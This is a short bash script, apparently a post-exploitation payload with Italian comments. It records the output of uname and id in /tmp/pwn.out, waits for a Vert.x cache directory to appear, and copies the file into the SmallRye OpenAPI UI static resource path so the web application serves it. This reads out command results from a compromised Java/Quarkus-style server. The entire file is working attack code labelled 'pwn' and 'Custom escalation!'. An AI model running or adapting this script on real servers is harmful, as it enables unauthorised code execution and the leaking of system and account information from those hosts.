#!/bin/bash

uname -a > /tmp/pwn.out
id       >> /tmp/pwn.out

echo "Custom escalation!" >> /tmp/pwn.out

# Attendi che almeno una sottocartella venga creata (max 30 tentativi)
for i in {1..30}; do
  target=$(find /tmp/vertx-cache/ -mindepth 1 -maxdepth 1 -type d | head -n 1)
  if [ -n "$target" ]; then
    break
  fi
  sleep 1
done

echo "target: $target" >> /tmp/pwn.out

if [ -z "$target" ]; then
  echo "No vertx-cache directory found" >> /tmp/pwn.out
else
  # Create full directory path if it doesn't exist
  dest_dir="$target/META-INF/io.smallrye_smallrye-open-api-ui__jar/META-INF/resources/openapi-ui"
  echo "Creating directory: $dest_dir" >> /tmp/pwn.out
  mkdir -p "$dest_dir"
  
  # Copy the file
  #echo "Copying to: $dest_dir/pwn.out" >> /tmp/pwn.out
  cp /tmp/pwn.out "$dest_dir/pwn.out"
  
  # Verify the copy succeeded
  #if [ -f "$dest_dir/pwn.out" ]; then
  #  echo "File successfully copied!" >> /tmp/pwn.out
  #else
  #  echo "File copy failed!" >> /tmp/pwn.out
  #fi
fi